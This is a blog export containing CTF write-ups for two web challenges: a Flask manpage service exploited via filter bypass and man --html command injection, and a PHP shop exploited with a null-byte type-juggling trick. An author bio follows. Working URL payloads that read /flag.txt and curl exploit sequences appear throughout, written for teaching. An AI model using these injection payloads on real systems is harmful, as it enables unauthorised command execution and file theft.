[{"content":"Background On the 8th of February, I participated in the Team Oceania CTF Qualifiers for 8 hours. In order to qualify for the team:\n1 2 3 4 5 6 7 8 9 10 11 12 The qualification criteria is… We’ll automatically qualify the two fastest full clears in each category (Rev, Web, Crypto, Pwn, Forensics). If you full clear more than one only your fastest qualifying category counts (so the first one you get 1st or 2nd place in) We’ll also qualify the top 6 on the leaderboard who did not previously qualify. Points will use dynamic scoring and only eligible players will affect the scoring (everyone else will be hidden). The other criteria are… Must be born on or after 1st January 1999. Must be over 18 years of age on the date of the international competition (roughly November) Must be a citizen/permanent resident of Australia, New Zealand, or a Pacific Island country. Since I was born in 1999, I am elligible to qualify, so I attempted to try my best at the web category and get top 2. I was able to get first blood on the login challenge but unfortunately the challenge took me a long time to solve, so I was unable to solve the remaining two web challenges. They were REALLY good web challenges and wanted to give a massive shout out to hashkitten who authored these challenges. I think if the quality of the challenges were poor, I would have been salty about not making the team but since I knew they were really well-made, I have a lot of confidence in the selection process, and I am looking forward to Team Oceania bringing home the gold!\nI have written writeups for the following web challenges:\nmanic (180) beans (230) login (235) manic (180) Description Hackers keep getting into my manpage service!\nhttp://challenges.oceaniacc.com:5001\nAttachments src-manic.tar.gz\nWriteup What do we have here? For this web challenge we are provided the source code via the attached compressed file src-manic.tar.gz. We decompress with the following command:\n1 tar xvf src-manic.tar.gz The source code consists of a python web application which essentially allows us to read the manual pages for specified commands.\nFor example, browsing to the link http://challenges.oceaniacc.com:5001/1/grep will give us section 1 of the grep command manual page.\nHow this works is it\u0026rsquo;s essentially running the man command in the backend with the arguments inputted within the URL, and displaying the output on the webpage:\n1 man 1 grep This logic can be observed at app.py#L11-L23\n1 2 3 4 5 6 7 8 9 10 11 12 13 @app.route(\u0026#39;/\u0026lt;path:command\u0026gt;\u0026#39;) def show_man_page(command): command_list = command.split(\u0026#39;/\u0026#39;) # Only alphanumeric please for i, cmd in enumerate(command_list): if not cmd.isalnum(): del command_list[i] result = subprocess.run([\u0026#39;man\u0026#39;, *command_list], capture_output=True, text=True) output = result.stderr if result.returncode != 0 else result.stdout return render_template(\u0026#39;manpage.html\u0026#39;, content=output) Let\u0026rsquo;s break down the code so that we can understand the security controls in place and if there are any vulnerabilities that arise.\nSource Code Breakdown First, let\u0026rsquo;s look at how the user inputs are initially passed.\n1 2 3 @app.route(\u0026#39;/\u0026lt;path:command\u0026gt;\u0026#39;) def show_man_page(command): command_list = command.split(\u0026#39;/\u0026#39;) A route is set up at the root of the webpage \u0026ldquo;/\u0026rdquo; and defines a dynamic URL parameter named command with the type path. Any input in the URL path after the root \u0026ldquo;/\u0026rdquo; will be saved in this command parameter.\nThis command parameter is passed to the show_man_page function and the value is split into a list, with the delimiter being \u0026ldquo;/\u0026rdquo;.\nFor example, when the URL is /1/grep, the value of command will be 1/grep and the value of command_list will become [\u0026quot;1\u0026quot;,\u0026quot;grep\u0026quot;].\nFollowing this, we observe a security control that attempts input sanitisation:\n1 2 3 4 # Only alphanumeric please for i, cmd in enumerate(command_list): if not cmd.isalnum(): del command_list[i] This code iterates through the command_list list with i being the index of the iteration and cmd being the value at the index.\nFor each iteration, using the isalnum function, if the value contains any characters that are not letters or digits, the list is modified to remove the current index.\nWhile this could be seen as appropriate input filtering to not allow special characters, a bypass can occur due to modifying the list while it is being iterated through.\nSay our command_list variable contains the value [\u0026quot;1\u0026quot;,\u0026quot;i!!egal\u0026quot;,\u0026quot;also_illeg@l\u0026quot;, \u0026quot;valid\u0026quot;, \u0026quot;also_valid\u0026quot;]. You would expect index 1 and 2 of the array to be deleted to result in [\u0026quot;1\u0026quot;, \u0026quot;valid\u0026quot;, \u0026quot;also_valid\u0026quot;]. However, this is not the case.\nLet\u0026rsquo;s see what happens in each iteration.\nIteration 0:\n1 2 3 4 5 6 7 command_list=[\u0026#34;1\u0026#34;,\u0026#34;i!!egal\u0026#34;,\u0026#34;also_illeg@l\u0026#34;, \u0026#34;valid\u0026#34;, \u0026#34;also_valid\u0026#34;] i=0 cmd=\u0026#34;1\u0026#34; is cmd alphanumeric? YES nothing happens Iteration 1:\n1 2 3 4 5 6 7 8 command_list=[\u0026#34;1\u0026#34;,\u0026#34;i!!egal\u0026#34;,\u0026#34;also_illeg@l\u0026#34;, \u0026#34;valid\u0026#34;, \u0026#34;also_valid\u0026#34;] i=1 cmd=\u0026#34;i!!egal\u0026#34; is cmd alphanumeric? NO Delete command_list[1]: command_list=[\u0026#34;1\u0026#34;,\u0026#34;also_illeg@l\u0026#34;, \u0026#34;valid\u0026#34;, \u0026#34;also_valid\u0026#34;] Iteration 2:\n1 2 3 4 5 6 command_list=[\u0026#34;1\u0026#34;,\u0026#34;also_illeg@l\u0026#34;, \u0026#34;valid\u0026#34;, \u0026#34;also_valid\u0026#34;] command_list=[\u0026#34;1\u0026#34;,\u0026#34;also_illeg@l\u0026#34;] i=2 cmd=\u0026#34;valid\u0026#34; Wait what we skipped the \u0026#34;also_illeg@l\u0026#34; value? After the rest of the iterations, as the following values are valid, nothing else gets deleted:\n1 command_list=[\u0026#34;1\u0026#34;,\u0026#34;also_illeg@l\u0026#34;, \u0026#34;valid\u0026#34;, \u0026#34;also_valid\u0026#34;] This occurs because when we process index 1 and delete it, the value of index 1 becomes the value of index 2, and so on the next iteration at index 2, we have skipped the original value of index 2.\nWe have successfully found a bypass on the input sanitisation method, now allowing us to input arbitrary characters (besides \u0026ldquo;/\u0026rdquo; due to the split function removing all of those).\nMoving on to the juicy part, command execution!\n1 2 result = subprocess.run([\u0026#39;man\u0026#39;, *command_list], capture_output=True, text=True) output = result.stderr if result.returncode != 0 else result.stdout We can see that the man command is executed with arguments provided by the user. If the inputs were only alphanumeric, then this code may not vulnerable, but as we found a way to bypass the input sanitisation, we can use hyphens to do argument injection.\nFinding the Right Argument to Inject One thing I tried to do is to see if we can do things such as glob expansions or command substitution, however, due to how the run function works, command substitutions or other shell shenanigans won\u0026rsquo;t be executed.\nLet\u0026rsquo;s step back to see what our objectives are. To obtain the flag, we can:\nAttempt to read the flag file at /flag.txt with the man binary Execute other binaries to obtain the contents of /flag.txt The location of the flag can be observed at Dockerfile#L11:\n1 COPY flag.txt / This part will require you to research each option until you are able to read the flag file. During my attempt of the challenge, I thought I could change the MANPATH and change the extensions of man pages that I read:\n1 2 3 -M, --manpath=PATH set search path for manual pages to PATH ... -e, --extension=EXTENSION limit search to extension type EXTENSION Testing man --manpath=/ --extension=txt locally did not work unfortunately and resulted me in getting stuck on why that didn\u0026rsquo;t work. I never found out why due to the lack of documentation and was unable to solve the challenge during the CTF duration.\nOn review of the solution after the CTF finished, I felt very silly not checking this option out.\n1 -H, --html[=BROWSER] use www-browser or BROWSER to display HTML output The fact that it says www-browser is a big hint because I have seen it link to the lynx browser in Debian. I can see this on my Debian install:\n1 2 3 4 5 6 $ which www-browser /usr/bin/www-browser $ ls -l /usr/bin/www-browser lrwxrwxrwx 1 root root 29 Oct 28 14:38 /usr/bin/www-browser -\u0026gt; /etc/alternatives/www-browser $ ls -l /etc/alternatives/www-browser lrwxrwxrwx 1 root root 13 Oct 28 14:38 /etc/alternatives/www-browser -\u0026gt; /usr/bin/lynx So, theoretically, if I specify another binary that isn\u0026rsquo;t a browser, it should execute. I tried to do this locally and execute the ls command, but it didn\u0026rsquo;t work. I don\u0026rsquo;t know the reason why but might be because it\u0026rsquo;s a different implementation of man compared to the container\u0026rsquo;s man binary.\n1 2 $ man --html=ls man man: command exited with status 3: (cd /tmp/hmanyFvR7I \u0026amp;\u0026amp; /usr/libexec/man-db/zsoelim) | (cd /tmp/hmanyFvR7I \u0026amp;\u0026amp; /usr/libexec/man-db/manconv -f UTF-8:ISO-8859-1 -t UTF-8//IGNORE) | (cd /tmp/hmanyFvR7I \u0026amp;\u0026amp; preconv -e UTF-8) | (cd /tmp/hmanyFvR7I \u0026amp;\u0026amp; tbl) | (cd /tmp/hmanyFvR7I \u0026amp;\u0026amp; groff -mandoc -Thtml) EDIT: Someone mentioned it not working on local machine on discord after the CTF and hashkitten (the author) mentioned you need to install some packages.\nI ran it in a local docker container instead, using the provided Dockerfile to match the exact environment and I was able to execute the ls binary!\n1 2 3 4 $ docker build -t manic . $ docker run -it --entrypoint bash manic nobody@21aa2caa1ab3:/app$ man --html=ls man /tmp/hmandNHcO9/man.html Utilising the Command Injection Testing with a few other commands, I found that the command being executed will look like this:\n1 \u0026lt;BROWSER\u0026gt; \u0026lt;TMP_DIR\u0026gt;/\u0026lt;COMMAND\u0026gt;.html So man --html=ls man will execute ls /tmp/\u0026lt;RANDOM_STRING\u0026gt;/man.html.\nYou can also include arguments for your commands like man --html=\u0026quot;ls -l\u0026quot; man\nNow all we have to do is read the flag!\n1 man --html=\u0026#34;cat /flag.txt\u0026#34; man Sure that works on the docker container, however, there\u0026rsquo;s a forward slash required in our payload! To bypass this, we identify that the command we specify in the HTML argument is safe from the subprocess.run function\u0026rsquo;s safe argument passing, allowing us to do shell expansions. Therefore, we can specify a slash with parameter expansion as we know the first character of the env variable PATH will be \u0026ldquo;/\u0026rdquo;:\n1 ${PATH:0:1} Our final command executed in the container will look like this:\n1 2 3 4 5 6 7 8 9 10 11 nobody@21aa2caa1ab3:/app$ man --html=\u0026#34;cat ${PATH:0:1}flag.txt\u0026#34; man oiccflag{test} \u0026lt;!-- Creator : groff version 1.22.4 --\u0026gt; \u0026lt;!-- CreationDate: Wed Feb 12 13:47:14 2025 --\u0026gt; \u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD HTML 4.01 Transitional//EN\u0026#34; \u0026#34;http://www.w3.org/TR/html4/loose.dtd\u0026#34;\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta name=\u0026#34;generator\u0026#34; content=\u0026#34;groff -Thtml, see www.gnu.org\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=US-ASCII\u0026#34;\u0026gt; ... SNIPPED ... Ok now we got a PoC working in the container. Time to convert this in URL form:\n1 http://challenges.oceaniacc.com:5001/$/--html=\u0026#34;cat ${PATH:0:1}flag.txt\u0026#34;/man When sending this we get the following error:\n1 2 3 4 sh: 1: Syntax error: Missing \u0026#39;}\u0026#39; sh: 1: 0: not found sh: 1: 1}flag.txt: not found man: couldn\u0026#39;t execute any browser from cat ${PATH:0:1}flag.txt Weird, is it not expanding properly? I try with just ${PATH}:\n1 2 3 4 http://challenges.oceaniacc.com:5001/$/--html=cat%20$%7BPATH%7Dflag.txt/man cat: \u0026#39;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binflag.txt\u0026#39;: No such file or directory man: couldn\u0026#39;t execute any browser from cat ${PATH}flag.txt Ok it actually resolved the PATH variable. It is known that the colons to extract substrings in parameter expansions don\u0026rsquo;t work in sh, so maybe it\u0026rsquo;s executing in a primitive shell. Looking at the solution, it uses the % operator which is used for pattern removal in parameter expansion. I can use this operator instead to remove the rest of the string to only give me /. I can\u0026rsquo;t use PATH though because it contains multiple forward slash characters. Let\u0026rsquo;s see what the value of PWD is.\n1 2 3 4 http://challenges.oceaniacc.com:5001/$/--html=cat%20$%7BPWD%7Dflag.txt/man cat: /appflag.txt: No such file or directory man: couldn\u0026#39;t execute any browser from cat ${PWD}flag.txt Note: PATH and PWD are well-known environment and shell variables. You can check out more common variables here but I prefer just executing the env command in the docker container to see what\u0026rsquo;s available.\nI can determine that PWD is /app. So if I do ${PWD%app}, this will result in just /. The final payload is here:\n1 http://challenges.oceaniacc.com:5001/$/--html=cat${PWD%app}flag.txt/man URL Encoded:\n1 http://challenges.oceaniacc.com:5001/$/--html=cat%20$%7BPWD%7Dflag.txt/man At the very top is our lovely flag!\n1 oiccflag{i_wish_i_did_this_more_securely_10a287eb} Other Command Injection Payloads I wanted to note a few other payloads that were posted in the discord which I thought were interesting.\nPython 1 http://127.0.0.1:1337/-1/-Hpython%20-c%20\u0026#39;print(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read())\u0026#39;%20%23/man Decoded URL:\n1 http://127.0.0.1:1337/-1/-Hpython -c \u0026#39;print(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read())\u0026#39; #/man Output:\nPython code:\n1 print(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()) Equivalent Python code\n1 print(open(\u0026#34;/flag.txt\u0026#34;).read()) The use of the chr function in Python is a common method to bypass character restrictions in Pyjails. In this case we are replacing the \u0026ldquo;/\u0026rdquo; character with chr(47).\nBase64 1 2 3 {base_url}/;/--html=\u0026#34;$(echo%20\\\u0026#39;L2ZsYWcudHh0\\\u0026#39;|base64%20-d)\u0026#34;/;/-l/;/app.py http://challenges.oceaniacc.com:5001/;/--html=%22$(echo%20\u0026#39;L2ZsYWcudHh0\u0026#39;|base64%20-d)%22/;/-l/;/app.py Decoded URL:\n1 {base_url}/;/--html=\u0026#34;$(echo \u0026#39;L2ZsYWcudHh0\u0026#39;|base64 -d)\u0026#34;/;/-l/;/app.py Output:\nBase64 allows the forward slash character to be encoded:\n1 L2ZsYWcudHh0 -\u0026gt; (base64 decode) -\u0026gt; /flag.txt Not sure why the -l app.py is there tbh. Might have been artifacts from previous injections. It still works but doesn\u0026rsquo;t seem like it\u0026rsquo;s required. The following works:\n1 http://challenges.oceaniacc.com:5001/;/--html=%22$(echo%20\u0026#39;L2ZsYWcudHh0\u0026#39;|base64%20-d)%22/man Decoded URL:\n1 http://challenges.oceaniacc.com:5001/;/--html=\u0026#34;$(echo \u0026#39;L2ZsYWcudHh0\u0026#39;|base64 -d)\u0026#34;/man One thing I tried with this payload is without the pipe character. So something like this would work if the bash shell was used:\n1 $(base64 -d \u0026lt;\u0026lt;\u0026lt; \u0026#39;L2ZsYWcudHh0\u0026#39;) However, this redirection operator doesn\u0026rsquo;t work on sh which means it won\u0026rsquo;t on this challenge.\nAdditionally, I wanted to highlight the use of the command substitution to print the flag in the error message rather than printing to stdout is very creative. However, this only works because the executable bit is set for the flag.txt file.\n1 2 3 4 5 6 7 $ ls -l /flag.txt -rw-r--r-- 1 root root 12 Feb 8 18:14 /flag.txt $ /flag.txt sh: 11: /flag.txt: Permission denied $ sudo chmod +x /flag.txt $ /flag.txt /flag.txt: 1: oicc{hello}: not found If stderr is not outputted or the executable bit is not set, I would make the payload like this:\n1 http://challenges.oceaniacc.com:5001/;/--html=cat%20$(echo%20\u0026#39;L2ZsYWcudHh0\u0026#39;|base64%20-d)/man URL decoded:\n1 http://challenges.oceaniacc.com:5001/;/--html=cat $(echo \u0026#39;L2ZsYWcudHh0\u0026#39;|base64 -d)/man Note a very interesting behaviour between the two payloads:\n1 http://challenges.oceaniacc.com:5001/;/--html=%22cat%20$(echo%20\u0026#39;L2ZsYWcudHh0\u0026#39;|base64%20-d)%22/man 1 http://challenges.oceaniacc.com:5001/;/--html=cat%20$(echo%20\u0026#39;L2ZsYWcudHh0\u0026#39;|base64%20-d)/man The difference is that the value for the --html argument is wrapped with double quotes. When wrapped with double quotes, the payload does not work. This is because when wrapping the initial command in a shell with double quotes, it will include the spaces as a part of the binary that it\u0026rsquo;s searching for to execute.\n1 2 3 4 5 $ \u0026#34;ls -l\u0026#34; sh: 15: ls -l: not found $ ls -l total 12 -rw-r--r-- 1 solopie solopie 89 Jan 14 22:51 README.m Bruh I found this one funny for some reason. The one thing I love about CTFs is that sometimes you\u0026rsquo;ll find a solution that seems very obvious but completely crosses your mind. No need for fancy expansions!\n1 http://challenges.oceaniacc.com:5001/-/-Hcd%20..%26%26cat%20flag.txt/-/man Decoded URL:\n1 http://challenges.oceaniacc.com:5001/-/-Hcd ..\u0026amp;\u0026amp;cat flag.txt/-/man Traverse to parent directory and read the flag\u0026hellip; As simple as it can get (as far as I know)!\nSorry if I missed out on any other payloads. Feel free to let me know of any other ideas in the comments and I\u0026rsquo;ll add them in if they work!\nPost challenge thoughts The reason why I couldn\u0026rsquo;t solve this challenge was due to my methodology when enumerating what arguments I could abuse. I lacked the experience to identify certain characteristics of arguments that would achieve the objective of reading the flag. In order to improve in this aspect, I have developed a blog to explore enumerating a binary\u0026rsquo;s options and identifying potential risks to arguments in binaries here (WIP).\nbeans (230) Description Some people made their money in tech, I made it in beans\nhttp://challenges.oceaniacc.com:5002\nAttachments src-beans.tar.gz\nWriteup DISCLAIMER: I wasn\u0026rsquo;t able to look at this challenge during the CTF duration, however, I decided to give it a crack without look at the solution first so I could document my thought process.\nBackground We are presented with a simple commerce site that allows us to buy and sell beans. We start with 100 bucks and 0 beans and with each bean having the value of 25 dollars. When attempting to press the Get Flag button, we are presented with the message You need 1337 money for the flag. Logically, we can\u0026rsquo;t profit since selling is the same price as buying. Therefore, we need to find a bypass for the amt variable that would let us sell more than we have to obtain more money.\nLet\u0026rsquo;s take a deep dive into the code!\nPHP Type Juggling Behaviour Shenanigans We first decompress the source code archive:\n1 tar xvf src-beans.tar.gz I want to specifically look at the sell function because the buy function isn\u0026rsquo;t going to get me more money.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function validate_integer($s) { return ctype_digit(trim($s)); } ... SNIPPED ... case \u0026#39;sell\u0026#39;: $amt = $_REQUEST[\u0026#39;amt\u0026#39;]; if (!validate_integer($amt)) { $error_msg = \u0026#34;That amount isn\u0026#39;t valid!\u0026#34;; break; } if ($amt \u0026lt; 0) { $error_msg = \u0026#34;You can\u0026#39;t sell negative beans!\u0026#34;; break; } if ($_SESSION[\u0026#39;beans\u0026#39;] \u0026lt; $amt) { $error_msg = \u0026#34;You don\u0026#39;t have that many beans to sell!\u0026#34;; break; } $_SESSION[\u0026#39;beans\u0026#39;] -= $amt; $_SESSION[\u0026#39;money\u0026#39;] += $amt * BEAN_COST; $success_msg = \u0026#34;Sold $amt beans.\u0026#34;; break; We observe the user-defined function validate_integer which is used to check if the amt variable is an integer. If the function indicates that it is not an integer, then an error is thrown. Looking at how the validation function works, there is an interesting quirk to it. It uses the trim function to get rid of whitespaces before checking if the input is a number. Technically, this means that any number with whitespaces is still considered valid.\nAs an example, I show that numbers that contain spaces before and after are considered valid:\n1 2 3 4 5 6 php \u0026gt; echo var_dump(validate_integer(\u0026#34;100\u0026#34;)); bool(true) php \u0026gt; echo var_dump(validate_integer(\u0026#34;100 \u0026#34;)); bool(true) php \u0026gt; echo var_dump(validate_integer(\u0026#34; 100 \u0026#34;)); bool(true) How could we potentially use this behaviour?\nLater in the sell functionality, we observe the conditional expression that checks if we have enough beans to sell. Remember our objective is to sell more beans than we actually have.\n1 if ($_SESSION[\u0026#39;beans\u0026#39;] \u0026lt; $amt) { In PHP, there is a feature called type juggling that allows comparisons between different types by attempting to convert them into one or the other.\nLet\u0026rsquo;s explore the behaviour for the less than sign (\u0026lt;):\n1 2 3 4 php \u0026gt; echo var_dump(1\u0026lt;\u0026#34;1a\u0026#34;); bool(true) php \u0026gt; echo var_dump(2\u0026lt;\u0026#34;1a\u0026#34;); bool(false) When comparing an integer with a string with the less than sign, what happens here is that the integer is converted to a string, and it is compared in alphabetical order. This is interesting to us because if you only observe the integers for the 1st comparison 1\u0026lt;\u0026quot;1a\u0026quot;, by including a non-digit in our string, in the context of the application there will be a logical error as the expected result for 1\u0026lt;1 is false. This occurs as both values are compared by alphabetical order.\nConsider this comparison:\n1 2 php \u0026gt; echo var_dump(2\u0026lt;\u0026#34;100a\u0026#34;); bool(false) In the context of the program, it would assume the comparison would be 2\u0026lt;100 which is true in terms of integers. However, if we include a character in the string, it becomes false due to comparing alphabetically when considering both sides as strings! This essentially defines the purpose for the validate_integer function in an attempt to ensure that string comparisons do not occur.\nWe have now identified a potential bypass for the beans check if we include non-digit characters within the amt input. While we can\u0026rsquo;t include letters like I have done in the examples, we can include whitespace which may potentially still cause the same behaviour of alphabetical comparisons instead.\nThe Infamous Byte First we need to look at what characters the trim function will strip to see what are our options. By default the function will strip these characters:\n1 2 3 4 5 6 \u0026#34; \u0026#34;: ASCII SP character 0x20, an ordinary space. \u0026#34;\\t\u0026#34;: ASCII HT character 0x09, a tab. \u0026#34;\\n\u0026#34;: ASCII LF character 0x0A, a new line (line feed). \u0026#34;\\r\u0026#34;: ASCII CR character 0x0D, a carriage return. \u0026#34;\\0\u0026#34;: ASCII NUL character 0x00, the NUL-byte. \u0026#34;\\v\u0026#34;: ASCII VT character 0x0B, a vertical tab. Next, we want to attempt to replicate the behaviour for 2\u0026lt;100a returning false.\n1 2 3 4 5 6 7 8 9 10 11 12 php \u0026gt; echo var_dump(2\u0026lt;\u0026#34;100 \u0026#34;); bool(true) php \u0026gt; echo var_dump(2\u0026lt;\u0026#34;100\\t\u0026#34;); bool(true) php \u0026gt; echo var_dump(2\u0026lt;\u0026#34;100\\n\u0026#34;); bool(true) php \u0026gt; echo var_dump(2\u0026lt;\u0026#34;100\\r\u0026#34;); bool(true) php \u0026gt; echo var_dump(2\u0026lt;\u0026#34;100\\0\u0026#34;); bool(false) php \u0026gt; echo var_dump(2\u0026lt;\u0026#34;100\\v\u0026#34;); bool(true) We observe the null byte has the same behaviour! Therefore, we can bypass the validate_integer function and cause the alphabetical comparison to buy more beans than we actually have.\nSolving the Challenge I will be running the following commands on a local docker instance. To set this up:\n1 2 docker build -t beans . docker run -p 1337:1337 beans First, grab a valid PHP session that tracks our beans and money:\n1 SESH_COOKIE=$(curl -s -i \u0026#34;http://localhost:1337\u0026#34; | sed -n \u0026#39;s/.*\\(PHPSESSID=[^;]*\\).*/\\1/p\u0026#39;) Buy two beans:\n1 curl -s -b \u0026#34;$SESH_COOKIE\u0026#34; \u0026#34;http://localhost:1337/?action=buy\u0026amp;amt=2\u0026#34; 1 2 3 4 5 6 7 \u0026lt;div class=\u0026#34;hand-drawn mb-8\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;text-xl mb-4\u0026#34;\u0026gt;Your Stash:\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;grid grid-cols-2 gap-4\u0026#34;\u0026gt; \u0026lt;div\u0026gt;Money: $50\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;Beans: 2\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; Sell 100 beans with a null byte in our amount. To include a null byte in the amt input, we can use url-encoding. If you want to see the HTML output, you will have to use --output - to indicate that you want to send to stdout:\n1 curl -s --output - -b \u0026#34;$SESH_COOKIE\u0026#34; \u0026#34;http://localhost:1337/?action=sell\u0026amp;amt=100%00\u0026#34; 1 2 3 4 5 6 7 \u0026lt;div class=\u0026#34;hand-drawn mb-8\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;text-xl mb-4\u0026#34;\u0026gt;Your Stash:\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;grid grid-cols-2 gap-4\u0026#34;\u0026gt; \u0026lt;div\u0026gt;Money: $2550\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;Beans: -98\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; Now we can buy the flag:\n1 curl -s -b \u0026#34;$SESH_COOKIE\u0026#34; \u0026#34;http://localhost:1337/?action=flag\u0026#34; | sed -n \u0026#39;s/.*\\(oicc.*\\)/\\1/p\u0026#39; 1 oiccflag{test} To replicate this on the challenge infrastructure:\n1 2 3 SESH_COOKIE=$(curl -s -i \u0026#34;http://challenges.oceaniacc.com:5002\u0026#34; | sed -n \u0026#39;s/.*\\(PHPSESSID=[^;]*\\).*/\\1/p\u0026#39;) curl -s -b \u0026#34;$SESH_COOKIE\u0026#34; \u0026#34;http://challenges.oceaniacc.com:5002/?action=buy\u0026amp;amt=2\u0026#34; curl -s --output - -b \u0026#34;$SESH_COOKIE\u0026#34; \u0026#34;http://challenges.oceaniacc.com:5002/?action=sell\u0026amp;amt=100%00\u0026#34; Unfortunately, the challenge infrastructure got taken down before I was able to solve this challenge so I don\u0026rsquo;t have the actual flag 😢\nPost Challenge Thoughts PHP quirks are interesting. I had to ask hashkitten about the string comparison logic because I had no idea why it was doing that originally. I assumed it was just magically removing the 0s in the string for whatever reason.\nIn hindsight, it does seem pretty obvious now. It would be good to explore PHP type juggling and identify what types get casted to what when type juggling occurs and also for different operators. I\u0026rsquo;m also interested to know if any other languages are affected by this and what are the differences in how it handles comparing different types. I know JavaScript is another language that has loose types so may have a blog about it in the future.\nlogin (235) Description Attachments Writeup ","date":"2025-02-14T00:00:00Z","image":"https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/oceania_logo_wide_hu_3f475c8f97995a5d.png","permalink":"https://www.solopie.com/p/team-oceania-ctf-qualifiers-2025-writeups/","title":"Team Oceania CTF Qualifiers 2025 Writeups"},{"content":"Hello 👋 My name is Jesse, I usually use the tag Solopie and like all things programming, especially the security aspects.\nI\u0026rsquo;m currently a Penetration Tester at Tanto Security and aim to be just as good as the real hackers out there!\nI\u0026rsquo;ve done CTFs here and there for about 4-5 years and aim to be an all-rounder. I do attempt to tackle the web category last though since I\u0026rsquo;m always doing web stuff at work anyway and to force myself to learn something new (web can get pretty cool too though). I\u0026rsquo;ve always been interested in tinkering as well so I\u0026rsquo;ve done my fair share of programming and want to eventually translate to creating devices that can manipulate the real world (IOT devices, robots, vehicle automation).\nCreated this page to try out the hype around Hugo which I\u0026rsquo;m pretty late too (I\u0026rsquo;ve procrastinated doing this for 2 years) and have recently been trying to get back into CTFs so might as well have somewhere to post writeups to! Considering doing educational content too but will be super basic stuff, we will see 👀\nLooking forward to producing some hopefully interesting content. Feel free to connect with me on Linkedin if you wanna reach out!\n","date":"2025-01-17T00:00:00Z","image":"https://www.solopie.com/p/hello-world/cover_hu_e95a4276bf860a84.jpg","permalink":"https://www.solopie.com/p/hello-world/","title":"Hello World!"}]